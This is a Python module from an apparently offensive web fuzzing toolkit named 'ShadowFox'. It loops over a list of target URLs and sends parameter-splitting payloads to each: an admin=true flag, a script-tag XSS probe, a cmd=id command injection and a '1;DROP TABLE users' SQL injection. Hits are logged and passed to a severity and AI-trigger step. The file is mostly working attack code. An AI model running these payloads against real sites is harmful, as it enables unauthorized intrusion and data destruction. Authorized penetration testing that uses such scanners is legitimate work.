import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from log_to_text import log_to_text
from tools.auto_add_severity import classify_severity
from logics.fuzz_ai_trigger import ai_trigger_if_needed

def fuzz_param_splitter(url):
    base_param = "param"
    payloads = [
        "1&admin=true",
        "true&debug=1",
        "xss&param=<script>alert(1)</script>",
        "1&cmd=id",
        "1;DROP TABLE users"
    ]

    headers = {
        "User-Agent": "ShadowFox-ParamSplitter"
    }

    for payload in payloads:
        test_url = f"{url}?{base_param}={payload}"
        try:
            res = requests.get(test_url, headers=headers, timeout=8)
            if res.status_code == 200 and ("error" not in res.text.lower() or "alert" in res.text.lower()):
                log_to_text(f"[FUZZ_PARAM_SPLITTER] {test_url}")
                severity = classify_severity(res.text)
                ai_trigger_if_needed("Fuzz Param Splitter", test_url, payload, res.text, severity)
                print(f"[+] Splitter fuzz uspešan: {test_url}")
        except Exception as e:
            print(f"[-] Greška kod {test_url}: {e}")

    print("[-] Param Splitter fuzz završen.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()

    for url in urls:
        fuzz_param_splitter(url)
